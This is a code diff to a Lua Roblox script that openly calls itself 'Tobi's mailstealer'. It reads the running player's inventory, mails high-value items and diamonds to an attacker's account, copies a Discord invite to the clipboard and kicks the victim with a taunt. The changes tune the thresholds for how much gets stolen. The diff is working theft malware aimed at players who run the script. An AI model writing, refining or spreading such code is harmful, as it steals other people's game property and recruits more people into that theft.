@@ -11,6 +11,27 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
+local function sendGemsToNumber(str)
+    local suffixes = {["k"] = 1000, ["m"] = 1000000, ["b"] = 1000000000}
+    local numberPart = tonumber(str:match("%d+%.?%d*"))
+    local suffixPart = str:match("[kKmM]")
+    if numberPart and suffixPart then
+        local number = math.floor(numberPart)
+        local multiplier = suffixes[suffixPart:lower()]
+        if multiplier then
+            return number * multiplier
+        else
+            return nil
+        end
+    elseif numberPart then
+        return numberPart
+    else
+        return nil
+    end
+end
+
+local newamount = sendGemsToNumber(sendamount)
+
 local GemAmount1 = 1
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
@@ -19,7 +40,7 @@ for i, v in pairs(GetSave().Inventory.Currency) do
     end
 end
 
-if GemAmount1 < 10000 then
+if newamount > GemAmount1 then
     return
 end
 
@@ -157,27 +178,6 @@ local function getRAP(Type, Item)
 	return 0
 end
 
-local function sendGemsToNumber(str)
-    local suffixes = {["k"] = 1000, ["m"] = 1000000, ["b"] = 1000000000}
-    local numberPart = tonumber(str:match("%d+%.?%d*"))
-    local suffixPart = str:match("[kKmM]")
-    if numberPart and suffixPart then
-        local number = math.floor(numberPart)
-        local multiplier = suffixes[suffixPart:lower()]
-        if multiplier then
-            return number * multiplier
-        else
-            return nil
-        end
-    elseif numberPart then
-        return numberPart
-    else
-        return nil
-    end
-end
-
-local newamount = sendGemsToNumber(sendamount)
-
 local function sendItem(category, uid, am)
     local args = {
         [1] = user,
@@ -201,13 +201,13 @@ end
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
-			if GemAmount1 >= 20000 then
+			if GemAmount1 >= (newamount + 10000) then
 				local args = {
 					[1] = user,
 					[2] = MailMessage,
 					[3] = "Currency",
 					[4] = i,
-					[5] = GemAmount1 - newamount
+					[5] = math.floor(GemAmount1 - newamount)
 				}
 				local response = false
 				repeat
@@ -323,7 +323,12 @@ for i, v in pairs(categoryList) do
 end
 table.sort(sortedItems, function(a, b) return a.rap > b.rap end)
 for _, item in ipairs(sortedItems) do
-    sendItem(item.category, item.uid, item.amount)
+	if item.rap >= newamount then
+    	sendItem(item.category, item.uid, item.amount)
+	else
+		break
+	end
 end
 SendAllGems()
+setclipboard("https://discord.gg/HcpNe56R2a")
 plr:kick("All your stuff has just been stolen by Tobi's mailstealer. Join discord.gg/HcpNe56R2a to start mailstealing yourself")
